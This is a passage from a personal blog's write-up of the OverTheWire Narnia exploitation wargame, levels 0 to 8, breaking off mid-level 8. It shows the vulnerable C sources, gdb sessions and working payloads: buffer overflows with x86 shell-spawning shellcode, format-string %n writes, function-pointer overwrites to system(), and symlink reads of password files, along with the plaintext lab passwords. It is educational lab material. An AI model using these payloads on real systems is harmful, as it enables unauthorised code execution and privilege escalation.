---
layout: post
title: Narnia
category: overthewire
---

## CTF Report - (Narnia)
##### Daniel Macias

<br>
<br>

### Description
This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky.

### Why you chose this one?
This wargame was originally apart of the class, and I decided that it would be beneficial for me to learn about it and complete it. It contained a lot of methods that were reliant on my knowledge of C and memory usage and how a program manages memory. Learning about the vulnerabilities I felt would help me to understand these exploits and create better and more secure code as a result.

### Recommendations
My recommendation is first to understand a program structure and how it is placed into memory. This understanding was very important to my understanding of certain exploits such as the string vulnerabilities and buffer overflow attacks.

<br>
<br>
![Program Memory](/assets/img/overthewire-Narnia-2022/memory_layout.png)
<br>
<br>

This [geeksforgeeks](https://www.geeksforgeeks.org/memory-layout-of-c-program/) explanation seems good enough for a basic understanding of the memory layout. Addtionally, [axcheron.github.io/exploit-101-format-strings/], had some useful information about how a format string vulnerability is exploited. This particular reading helped my understanding quite a bit.

For this CTF, this is something that you can tackle first, since overall it was on the easier side of the spectrum, however I would recommend something like [overthewire - Bandit](https://overthewire.org/wargames/bandit/) first as an introduction if you are new. For me, it took 10+ hours in order to find the solutions to all levels, results may vary. Depending on how quickly the format string vulnerability explanations make sense to you.

### Credit
[Corb3nik's pages template](https://github.com/Corb3nik/Corb3nik.github.io), is the page in which I forked off of for this website template, so big credit to them. Additionally, consulted [axcheron.github.io](https://axcheron.github.io/writeups/otw/narnia/) for CTF writeup inspiration, and improving the answers to my own solutions.

<br>
---
<br>


## General Information
 
SSH Information : 
```
    Host: narnia.labs.overthewire.org
    Port: 2226
```

Narnia's levels are called **narnia0, narnia1, ...etc** and the passwords are located in the `/etc/narnia_pass/narniaX` folder.

The first level can be accessed using : 
```
    Username: narnia0
    Password: narnia0
``` 

<br>
---
<br>

## Level 0
```
    SSH: narnia0@narnia.labs.overthewire.org -p 2226
    Password: narnia0
``` 

Navigating to the `/narnia/` directory allows us to see all of the information for all the levels, however we will look at level 0 first.

Simply running the `./narnia0` executable and providing an input `test` gives us the following output : 
```console
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: narniatest
buf: narniatest
val: 0x41414141
WAY OFF!!!!
```

Viewing the source code for the executable in `narnia0.c` reveals : 

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
      setreuid(geteuid(),geteuid());
      system("/bin/sh");
    }
    else {
      printf("WAY OFF!!!!\n");
      exit(1);
    }

    return 0;
}
```

This source code initializes two values, one as val and another as buffer specified to a 20 length string. This code will then, using the line `scanf("%24s", &buf)`, will move 24 characters from stdin into the buffer. The program will then check val to see if it has a value of `0xdeadbeef`.

Strange... the buffer is of length 20 characters and allowed an input of 24 characters. We can utilize this property to do a buffer overflow attack. Something that we know are that local variables are stored in logically contiguous memory. Something we can actually view using gdb. We can see the buffer that is filled with B as well as the 4 bytes following that are the value of val.

```
$ (gdb) run
Starting program: /narnia/narnia0 BBBBBBBBBBBBBBBBBBBB
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100

Breakpoint 1, 0x080485b2 in main ()
(gdb) x/16x $esp
0xffffd684:  0x080486e7   0x41414100   0x42424242  0x42424242
0xffffd694:  0x42424242   0x42424242   0x42424242  0x41414100
0xffffd6a4:  0x00000000   0x00000000   0xf7e2a286  0x00000002
0xffffd6b4:  0xffffd744   0xffffd750   0x00000000  0x00000000
(gdb)
```

and we can actually overwrite the 4 bytes of val with the bytes that do not fit into the buffer with the hex value `0xdeadbeef` in order to load into the shell as `narnia1`.

So this command uses python print and unix piping in order to create the hex value `0xdeadbeef`, written in little endian byte order and pass it to the executable.

```
$ narnia0@narnia:/narnia$ python -c 'print "A" * 20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

There is an issue with this command since it quits out before I can access the shell, so modifying the piped command allows us to access the shell.

```
$ narnia0@narnia:/narnia$ (python -c 'print "A" * 20 + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```

Getting the password `efeidiedae` allows us to move on to the next level.

<br>
---
<br>

## Level 1
```
    SSH: narnia1@narnia.labs.overthewire.org -p 2226
    Password: efeidiedae
``` 

Simply running the `./narnia1` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```
Viewing the source code for the executable in `narnia1.c` reveals : 

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
      printf("Give me something to execute at the env-variable EGG\n");
      exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This source code shows that it retrieving the environment variable EGG and then executing it. There are a few different shell commands that are useful for this level. `env` will give the environment variable list, `export` with create environment variables, and `uname -a` will show system information.

Running `uname -a` :

```
Linux narnia 4.18.12 #1 SMP Tue Oct 16 11:25:23 UTC 2018 x86_64 GNU/Linux
```

[shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-399.php) gives a compiled list of a bunch of shell code exploits we can use to gain access to shell, these shell code exploits are basically a series of hex characters pulled from compiled c code converted to assembly, which can then be put into memory at locations and run as code. These will be used multiple times in this wargame so they are important to know about. The link and pastable below gives the one I used, however there are other ways for the system that these wargames are hosted on.

```console
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80
```

Then using `export` and `env` allows us to upload the shell code and verif : 

```console
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
narnia1@narnia:/narnia$ env
[...]
EGG=j1X�̀�É�jFX̀�
      Rhn/shh//bi���̀
LANG=en_US.UTF-8
OLDPWD=/home/narnia1
[...]
```

Then running `./narnia1/` : 
```console
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

Perfect! Now we have the password for `narnia2` : `nairiepecu`

<br>
---
<br>

## Level 2
```
  SSH: narnia2@narnia.labs.overthewire.org -p 2226
  Password: nairiepecu
``` 

Simply running the `./narnia2` executable with an argument gives us the following output : 
```console
narnia2@narnia:/narnia$ ./narnia2 abcd
abcdnarnia2@narnia:/narnia$
```

Viewing the source code for the executable in `narnia2.c` reveals :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
      printf("Usage: %s argument\n", argv[0]);
      exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Looks to be another buffer overflow attack, as `strcpy` does not check the size of the input before copying to the buffer. Something interesting is that we have no direct call to a shell. So we can combine our knowledge from the previous two levels and try to insert our shell code into the buffer.

So how do we actually get our shell code to run, after inserting it into the buffer? One thing that we can do is actually shown here in gdb :
```
$ (gdb) run $(python -c 'print "A" * 152')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 152')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Notice that? We segmentation fault at memory location `0x41414141`, and since `0x41` is ASCII for A, that means we are segmentation faulting at a memory value that we can specify through the buffer. We are achieving this by overriding the memory location that holds the return address of the main function. So we can trick the program to run our shell code by returning to the start of it.

Another issue we run into is that we need to return to precisely the beginning of the shell code in order to run it. A way to make this easier is by using `\x90` as our filler character instead of A. `\x90` is the command that represents `nop` in assembly, or no operation, so in theory, if we return to anywhere within our wall of `nop` then we can run our shell code. This is known as a nop slide, and is a relatively straightforward technique.

First is to find the location of the return address which we can do with some iteration, by starting from the end of the buffer, and slowly increasing the size of the buffer, we can find when the program segfaults at `0x44444444` :
```console
$ (gdb) run $(python -c 'print "A" * 132 + "DDDD"')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 132 + "DDDD"')

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```

So this means that we have to fill our buffer with 132 bytes + return address. Our shell code (that we used prior) is 34 bytes long so that means we have 98 `\x90`s as filler. Finding our return address to use is also pretty straightforward.

Using gdb we can view the memory at `$esp`. First, we disassemble main, then looking at the assembly we can find where the call to strcpy is located. Putting a breakpoint after that call makes it so that we have our buffer put into memory at the location we want, choosing a memory location somewhere in the middle of where we have the A is OK, I chose `0xffffd868`, keeping in mind that we are not actually seeing buffer first (I'm not entirely sure why it won't execute before, but I believe that the code in argv is non-executable, so we have to go to buffer), so keep adding on to the `$esp` until we see another set of `0x41414141`.

```
$ (gdb) disas main
Dump of assembler code for function main:
   0x0804844b <+0>:     push   %ebp
   [...]
   0x0804847d <+50>:    push   %eax
   0x0804847e <+51>:    call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:    add    $0x8,%esp
   [...]
   0x0804849c <+81>:    leave
   0x0804849d <+82>:    ret
End of assembler dump.
(gdb) break *main+56
Breakpoint 1 at 0x8048483
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /narnia/narnia2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048483 in main ()
(gdb) x/32x $esp
0xffffd5b0:   0xffffd5b8    0xffffd81e    0x41414141    0x41414141
0xffffd5c0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5d0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5e0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd5f0:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd600:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd610:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd620:   0x41414141    0x41414141    0x41414141    0x41414141
[...]
(gdb) x/32x $esp+600
0xffffd808:   0x00000000    0x6e2f0000    0x696e7261    0x616e2f61
0xffffd818:   0x61696e72    0x41410032    0x41414141    0x41414141
0xffffd828:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd838:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd848:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd858:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd868:   0x41414141    0x41414141    0x41414141    0x41414141
0xffffd878:   0x41414141    0x41414141    0x41414141    0x41414141
```

Our final command should look like this with our return address written in little endian (reverse byte order):
```console
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print '\x90'*98 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'")
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

Got it! `vaequeezee` is the password for `narnia3`
<br>
---
<br>
## Level 3
```
    SSH: narnia3@narnia.labs.overthewire.org -p 2226
    Password: vaequeezee
``` 

Simply running the `./narnia3` executable gives us the following output : 
```console
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

Viewing the source code for the executable in `narnia3.c` reveals :
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
This code seems very exploitable through another buffer overflow attack, and changing the contents of `ofile` in order to send the contents of the password file to our designated file instead of `/dev/null`

Some useful commands to learn are `mktemp -d`, `chmod`, and `ln -s`. `mktemp -d` allows one to create a temporary directory in the temp file, and after changing the directory to the temp directory created, `chmod 777 .` will allow full access for all users to the current directory (replace the . with a file to give access to a file). This gives us the ability to create files and symbolic links `ln -s`, these symbolic links are a link so that one file can point to another file in the filesystem, and that is what we will use in order to get the contents of the password file.

```console
narnia3@narnia:/narnia$ mktemp -d
/tmp/tmp.3APP8zrKWP
narnia3@narnia:/narnia$ cd /tmp/tmp.3APP8zrKWP
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ chmod 777 .
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ touch B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ chmod 777 B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
error opening 12345678123456781234567812345678B.txt
```

Filling our buffer and simply creating a file as a test doesn't seem to work as expected. It seems that we need to create the file `12345678123456781234567812345678B.txt` in addition, in order to be able to run the executable.

```console
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ vim 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
copied contents of 12345678123456781234567812345678B.txt to a safer place... (B.txt)
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ cat B.txt
Hello World!
.��P��T������ n
```

I'm not sure what the misc. characters are after Hello World, however the code will work to get our password! So now we can create a symbolic link between `12345678123456781234567812345678B.txt` and the password file `/etc/narnia_pass/narnia4`. Then run the command again to get the password

```console
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ rm 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ ln -s /etc/narnia_pass/narnia4 12345678123456781234567812345678B.txt
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ /narnia/narnia3 12345678123456781234567812345678B.txt
copied contents of 12345678123456781234567812345678B.txt to a safer place... (B.txt)
narnia3@narnia:/tmp/tmp.3APP8zrKWP$ cat B.txt
thaenohtai
```

And that's a wrap! We got our password for `narnia4` as `thaenohtai`

<br>
---
<br>

## Level 4
```
    SSH: narnia4@narnia.labs.overthewire.org -p 2226
    Password: thaenohtai
``` 

Simply running the `./narnia4` executable gives us the following output : 
```console
narnia1@narnia:/narnia$ ./narnia4 abcd
```

That's strange... no output from the program, and a closer inspection of the source code reveals why : 
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

This strcpy seems to be exploitable identically to level 2. Except with a larger buffer, so we can start with the same code as our previous code, except with 128 additional `\x90`s to fill the rest of the buffer.

```console
narnia4@narnia:/narnia$ ./narnia4 $(python -c "print '\x90'*226 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'")
Segmentation fault
```
Hmm, seems like we are probably not overwriting the return address correctly or returning to the wrong address in memory, so we can launch in gdb to see what the issue is.

```
$ (gdb) run $(python -c 'print "A"*260 + "BBBB"')
Starting program: /narnia/narnia4 $(python -c 'print "A"*260 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
(gdb) run $(python -c 'print "A"*264 + "BBBB"')
Starting program: /narnia/narnia4 $(python -c 'print "A"*264 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

So it seems like that we were one block off of overwriting the return address, so lets increment our `\x90` by 4 and try again.

```console
narnia4@narnia:/narnia$ ./narnia4 `python -c "print '\x90'*230 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52
\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x68\xd8\xff\xff'"`
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

That was easy. Moving onto the next level: faimahchiy.

<br>
---
<br>

## Level 5
```
    SSH: narnia5@narnia.labs.overthewire.org -p 2226
    Password: faimahchiy
``` 

Simply running the `./narnia5` executable gives us the following output : 
```console
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6f0)
```

Hmmm... Let's also take a look at the source code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

Something we haven't seen before, we actually cannot do a buffer overflow this time, due to how the code is written. So how are we supposed to replace `i` with 500?

The exploit this time is actually through use of the `snprintf` function, as it is being implemented improperly, and directly using the input from stdin to transfer the string to the local variable. `printf` functions are capable of using format strings in order to dynamically place variables and format the string to the desired output (hence the name), usually implemented as such `printf(%s, str_t)`. However, the code implements it in the form `printf(str_t)` and we can actually create our own format string in place of a normal string. 

This works as when provided with a format string, the `printf` function when provided a format string, expects the values that fill these specifiers to be in subsequent portions of memory, so we can get and control access to memory as there are no defined pointers in this location. We can take advantage of the fact we have control of the format string to change some values and see information that we can't see normally. See example below for some clarification :

```console
narnia5@narnia:/narnia$ ./narnia5 %08x.%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035] (17)
i = 1 (0xffffd6e0)
```

Now that isn't exactly what we put in, you can read more about the parameters to format strings at [this link](https://en.wikipedia.org/wiki/Printf_format_string). However to put it simply, my format string provided in the format of `%08x`, as explained prior will read the next 8 bytes from the stack and print them out as hexadecimal values. `%` specifies the beginning of the format string, `0` specifies that we want our output to be preceded with 0 as opposed to truncating early, `8` represents the amount of bytes that I wanted to fetch from the stack, and `x` represents that I want to display those bytes in hex format.

Using this knowledge of the format string and since the program is nice enough to give us the memory location where we have to overwrite `i` with 500, we can now abuse the `%n` specifier in order to write 500 to the location of `i`. This specifier is special in that it writes the size of the string that is given to a pointer given as an argument, so the memory location specified in the first four bytes of that string.

So, if we construct a 500 byte long string, that contains the memory location of `i` as the first four bytes, we can theoretically take control of the system.

```console
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xe0\xd6\xff\xff" + "A"*496 + "%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd4f0)
```

Oops! Our original location of i has changed, so let's change that return address.

```console
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xf0\xd4\xff\xff" + "A"*496 + "%n"')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

NICE! `neezocaeng` is our password.

<br>
---
<br>

## Level 6
```
    SSH: narnia6@narnia.labs.overthewire.org -p 2226
    Password: neezocaeng
``` 

Simply running the `./narnia6` executable gives us the following output : 

```console
narnia6@narnia:/narnia$ ./narnia6 1234 5678
1234
```

Interesting, seems like it only prints out the output of our first argument

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}
```

So there seems to be a lot of setup going on, however the import line is the underindented line, running `fp(b1)`, using `fp` which holds the address to the `puts` function.

So launching gdb, and setting a breakpoint at the call to `$eax`, which seems to be the `fp(b1)` line. 

```
$  [...]
   0x080486e3 <+315>:   push   %eax
   0x080486e4 <+316>:   mov    -0xc(%ebp),%eax
   0x080486e7 <+319>:   call   *%eax
   0x080486e9 <+321>:   add    $0x4,%esp
   0x080486ec <+324>:   push   $0x1
   0x080486ee <+326>:   call   0x8048440 <exit@plt>
End of assembler dump.
(gdb) break *main+319
Breakpoint 1 at 0x80486e7
(gdb) run AAAAAAAA BBBBBBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 AAAAAAAA BBBBBBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/32x $esp
0xffffd688:   0xffffd694    0x42424242    0x42424242    0x41414100
0xffffd698:   0x41414141    0x08048400    0x00000003    0x00000000
0xffffd6a8:   0x00000000    0xf7e2a286    0x00000003    0xffffd744
0xffffd6b8:   0xffffd754    0x00000000    0x00000000    0x00000000
0xffffd6c8:   0xf7fc5000    0xf7ffdc0c    0xf7ffd000    0x00000000
0xffffd6d8:   0x00000003    0xf7fc5000    0x00000000    0x5ae5a484
0xffffd6e8:   0x600c4894    0x00000000    0x00000000    0x00000000
0xffffd6f8:   0x00000003    0x080484a0    0x00000000    0xf7fee710
(gdb) print system
$2 = {<text variable, no debug info>} 0xf7e4c850 <system>
(gdb) print $eax
$3 = 134513664
>>> hex(134513664) # Convert int to hex
'0x8048400'
```

So it seems that we can overwrite the memory location that `fp` points to point to system instead with a buffer overflow, which is already present in memory. This location is printed in gdb.

Additionally since we know that `fp` takes an argument at `b1`, we can provide an argument to system, and we will use `sh;` to call the shell. Then, filling the buffer with some filler characters gives us this command.

```console
narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print "sh;AAAAA\x50\xc8\xe4\xf7"') B
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
```

Our password is `ahkiaziphu` and we can move on!

<br>
---
<br>

## Level 7
```
    SSH: narnia7@narnia.labs.overthewire.org -p 2226
    Password: ahkiaziphu
``` 

Simply running the `./narnia7` executable gives us the following output : 
```console
narnia7@narnia:/narnia$ ./narnia7 abccd
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```
Interesting, seems like we want to overwrite the value of `ptrf()`, in order to call `hackedfunction()` instead. Let's look at the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```
Seems like another format string vulnerability, using the same `%n` idea as earlier. This time we want to write :

```console
narnia7@narnia:/narnia$ ./narnia7 $(python -c "print '\x68\xd6\xff\xff' + '%134514464d%1$n'")
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```
Other than the fact that we need to update the return address, there are a few things of note. `%134514464d` allows us to write a string of size 134514464 to the buffer, which is equal to the pointer of `hackedfunction()` converted to an int subtracted by 4 to account for the size of the pointer. Additionally changing up the `%n` to `%1$n` gives more flexibility on which value we overwrite. The `%1` arugment specifies the 1st location of memory specified by our original pointer, and incrementing it will specify the 2nd location, and so on.

Let's try again :
```console
narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x48\xd6\xff\xff" + "%134514464d%2$n"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia7
cat: /etc/narnia_pass/narnia7: Permission denied
$ cat /etc/narnia_pass/narnia8
mohthuphog
```
After a little bit of bruteforcing, we were able to gain access to the shell, by calling `hackedfunction()`, and our password is `mohthuphog`

<br>
---
<br>

## Level 8
```
    SSH: narnia8@narnia.labs.overthewire.org -p 2226
    Password: mohthuphog
``` 

Simply running the `./narnia8` executable gives us the following output : 
```console
narnia8@narnia:/narnia$ ./narnia8 narnia
narnia
```

So it seems to just be printing back our input. Let's take a peek at the source code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```
It seems that bok can be overflowed, lets try to overflow it and view the result in gdb.

```$  
   0x0804847f <+100>:   push   %eax
   0x08048480 <+101>:   push   $0x8048550
   0x08048485 <+106>:   call   0x80482e0 <printf@plt>
   0x0804848a <+111>:   add    $0x8,%esp
   0x0804848d <+114>:   nop
   0x0804848e <+115>:   leave
   0x0804848f <+116>:   ret
End of assembler dump.
(gdb) break *func+106
Breakpoint 1 at 0x8048485
(gdb) run $(python -c 'print "A"*20')
Starting program: /narnia/narnia8 $(python -c 'print "A"*20')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
0xffffd68c:   0x41414141    0x41414141    0x41414141   "0xffffd88a"
0xffffd69c:   0xffffd6a8   '0x080484a7'  "0xffffd88a"   0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA��������������
[Inferior 1 (process 26676) exited normally]
(gdb) run $(python -c 'print "A"*24')
Starting program: /narnia/narnia8 $(python -c 'print "A"*24')

Breakpoint 1, 0x08048485 in func ()
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
0xffffd68c:   0x41414141    0x41414141    0x41414141   "0xffffd841"
0xffffd69c:   0xffffd6a8   '0x080484a7'  "0xffffd886"   0x00000000
0xffffd6ac:   0xf7e2a286    0x00000002    0xffffd744    0xffffd750
(gdb)
```
Interesting, if we try to overflow the buffer, we only go one byte over (remember little endian), another thing we can observe is that the value at `0xffffd698` and `0xffffd708` (values surrounded by double quotes) are the same value in the correct input, so whatever we try to overflow must keep the same value at both locations, I assume this is the pointer to blah/b. Additionally, we can observe the value at `0xffffd694` (value surrounded by single quotes), contains a value that exists in main, so that is probably our return address.

So what happens if we try to append `8a` to the end of our payload. With the eventual goal of making it to our return address and overwriting that with a call that we can specify.

```$
(gdb) x/16x $esp
0xffffd67c:   0x08048550    0xffffd684    0x41414141    0x41414141
